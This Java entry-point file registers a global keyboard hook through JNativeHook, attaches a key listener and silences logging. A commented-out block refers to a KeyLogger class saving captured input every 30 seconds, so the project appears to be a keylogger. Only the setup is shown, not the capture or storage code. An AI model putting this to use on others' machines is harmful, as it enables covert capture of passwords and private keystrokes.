package Working;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import java.util.logging.LogManager;

public class Main {
    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
        GlobalScreen.addNativeKeyListener(new GlobalKeyListener());
        LogManager.getLogManager().reset();
    }

//    public void SaveFile() {
//        long start = System.currentTimeMillis();
//        while (true) {
////	            if(System.currentTimeMillis() - start == 30000){
//////	                KeyLogger.nativeKeyBoard.onSave();
////	                start = System.currentTimeMillis();
////	            }
////	        }
//        }
//    }
}
